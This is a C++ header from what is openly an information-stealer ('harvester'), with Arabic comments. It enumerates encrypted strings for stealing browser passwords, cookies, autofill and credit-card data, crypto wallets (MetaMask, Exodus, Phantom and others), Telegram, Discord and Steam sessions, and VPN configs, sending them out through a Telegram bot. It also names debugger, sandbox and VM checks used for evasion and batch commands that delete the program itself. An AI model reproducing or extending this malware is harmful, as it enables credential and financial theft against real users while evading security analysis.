// harvester/crypto/obfuscation.h
// إصدار موسع – يشمل جميع السلاسل اللازمة للميزات الجديدة
#pragma once

#include <string>
#include <vector>

std::string DecryptString(const std::vector<unsigned char>& cipher,
                          const std::vector<unsigned char>& iv,
                          const std::vector<unsigned char>& key);

std::string GetObfuscatedString(int id);

// -------------------------------------------------------------------
// قائمة بكل السلاسل النصية الحساسة (حتى المعرف 150)
// -------------------------------------------------------------------
enum ObfuscatedStringID {
    // === السلاسل السابقة (1-72) ===
    STR_TDATA = 1,
    STR_TELEGRAM_DESKTOP = 2,
    STR_API_TELEGRAM = 3,
    STR_BOT_TOKEN_PLACE = 4,
    STR_SEND_DOCUMENT = 5,
    STR_CHROME = 6,
    STR_EDGE = 7,
    STR_BRAVE = 8,
    STR_OPERA = 9,
    STR_VIVALDI = 10,
    STR_SAFARI = 11,
    STR_TOR_BROWSER = 12,
    STR_CHROMIUM = 13,
    STR_EPIC = 14,
    STR_OPERA_GX = 15,
    STR_CHROME_DATA = 16,
    STR_EDGE_DATA = 17,
    STR_BRAVE_DATA = 18,
    STR_OPERA_DATA = 19,
    STR_VIVALDI_DATA = 20,
    STR_SAFARI_DATA = 21,
    STR_TOR_DATA = 22,
    STR_CHROMIUM_DATA = 23,
    STR_EPIC_DATA = 24,
    STR_OPERA_GX_DATA = 25,
    STR_LOCAL_STATE = 26,
    STR_LOGIN_DATA = 27,
    STR_COOKIES = 28,
    STR_WEB_DATA = 29,
    STR_FIREFOX_PROFILES = 30,
    STR_KEY4_DB = 31,
    STR_LOGINS_JSON = 32,
    STR_COOKIES_SQLITE = 33,
    STR_CANNOT_OPEN_FILE = 34,
    STR_CANNOT_READ_FILE = 35,
    STR_ATTEMPT = 36,
    STR_FAILED_RESPONSE = 37,
    STR_SEND_SUCCESS = 38,
    STR_SEND_FAILED = 39,
    STR_POWERSHELL_COMPRESS = 40,
    STR_VMTOOLSD = 41,
    STR_PROCMON = 42,
    STR_PROCEXP = 43,
    STR_WIRESHARK = 44,
    STR_X64DBG = 45,
    STR_OLLYDBG = 46,
    STR_IDA = 47,
    STR_WINDBG = 48,
    STR_VBOXSERVICE = 49,
    STR_SANDBOX = 50,
    STR_MALWARE = 51,
    STR_ANALYSIS = 52,
    STR_VIRUS = 53,
    STR_TEST = 54,
    STR_USER = 55,
    STR_VIRTUAL = 56,
    STR_KEY_DATAS = 57,
    STR_MAP_PREFIX = 58,
    STR_BAT_ECHO_OFF = 59,
    STR_BAT_LOOP = 60,
    STR_BAT_DEL = 61,
    STR_BAT_IF_EXIST = 62,
    STR_BAT_GOTO_LOOP = 63,
    STR_BAT_DEL_SELF = 64,
    STR_USER_AGENT = 65,
    STR_MULTIPART_BOUNDARY = 66,
    STR_CONTENT_DISPOSITION_CHAT = 67,
    STR_CONTENT_DISPOSITION_DOC = 68,
    STR_CONTENT_TYPE_ZIP = 69,
    STR_WILDCARD_DEST = 70,
    STR_BOT_TOKEN = 71,
    STR_CHAT_ID = 72,
    
    // === سلاسل جديدة للميزات الإضافية (73-150) ===
    
    // خدمات IP العام
    STR_IP_API_URL = 73,          // "https://api.ipify.org"
    STR_IP_API2_URL = 74,         // "https://icanhazip.com"
    
    // معلومات النظام – حقول التقرير
    STR_SYSTEM_INFO = 75,
    STR_IP_ADDRESS = 76,
    STR_COMPUTER_NAME = 77,
    STR_USER_NAME = 78,
    STR_OS_VERSION = 79,
    STR_ARCHITECTURE = 80,
    STR_RAM = 81,
    STR_CPU = 82,
    STR_GPU = 83,
    STR_LANGUAGE = 84,
    STR_TIMEZONE = 85,
    STR_INSTALLED_SOFTWARE = 86,
    
    // البرامج المستهدفة – أسماء
    STR_DISCORD = 87,
    STR_VIBER = 88,
    STR_TLAUNCHER = 89,
    STR_STEAM = 90,
    STR_BLUESTACKS = 91,
    STR_WALLETS = 92,
    STR_EXODUS = 93,
    STR_ATOMIC = 94,
    STR_ELECTRUM = 95,
    STR_GUARDA = 96,
    STR_COINOMI = 97,
    STR_METAMASK = 98,
    STR_COINBASE_WALLET = 99,
    STR_BINANCE_WALLET = 100,
    STR_PHANTOM = 101,
    STR_RONIN = 102,
    STR_TRONLINK = 103,
    STR_TRUST_WALLET = 104,
    STR_OPENVPN = 105,
    STR_NORDVPN = 106,
    STR_PROTONVPN = 107,
    
    // مسارات الريجستري للبرامج المثبتة
    STR_REG_UNINSTALL = 108,      // "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
    STR_REG_UNINSTALL_WOW64 = 109, // "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
    
    // مجلدات التثبيت الشائعة
    STR_PROGRAM_FILES = 110,
    STR_PROGRAM_FILES_X86 = 111,
    STR_APPDATA = 112,
    STR_LOCAL_APPDATA = 113,
    
    // أسماء الملفات والمجلدات الجديدة للتقرير
    STR_REPORT_HTML = 114,        // "report.html"
    STR_SYSTEM_TXT = 115,         // "system_info.txt"
    STR_PASSWORDS_DIR = 116,      // "Passwords"
    STR_COOKIES_DIR = 117,        // "Cookies"
    STR_HISTORY_DIR = 118,        // "History"
    STR_BOOKMARKS_DIR = 119,      // "Bookmarks"
    STR_AUTOFILLS_DIR = 120,      // "AutoFills"
    STR_WALLETS_DIR = 121,        // "Wallets"
    STR_SESSIONS_DIR = 122,       // "Sessions"
    STR_DETECTED_APPS = 123,      // "detected_apps.txt"
    
    // حقول التقرير النصية
    STR_PC_USER_INFORMATION = 124, // "PC USER INFORMATION"
    STR_BASIC_INFORMATION = 125,   // "BASIC INFORMATION"
    STR_GRABBED_SOFTWARE = 126,    // "GRABBED SOFTWARE"
    STR_DOMAINS_DETECTED = 127,    // "DOMAINS DETECTED"
    STR_PASSWORDS_COUNT = 128,     // "Passwords - "
    STR_COOKIES_COUNT = 129,       // "Cookies - "
    STR_HISTORY_COUNT = 130,       // "History - "
    STR_AUTOFILLS_COUNT = 131,     // "AutoFills - "
    STR_CC_COUNT = 132,            // "CC - "
    STR_GRABBED_FILES_COUNT = 133, // "Grabbed Files - "
    STR_GITHUB_DOMAIN = 134,       // "github.com"
    
    // أسماء الملفات الداخلية للتقرير
    STR_PASSWORDS_TXT = 135,       // "passwords.txt" (كلمات مرور مفكوكة)
    STR_COOKIES_TXT = 136,         // "cookies_export.txt"
    STR_HISTORY_CSV = 137,         // "history.csv"
    STR_BOOKMARKS_JSON = 138,      // "bookmarks.json"
    STR_AUTOFILLS_CSV = 139,       // "autofills.csv"
    
    // كل ما تبقى (مكان للمستقبل)
    STR_LAST_DUMMY = 150
};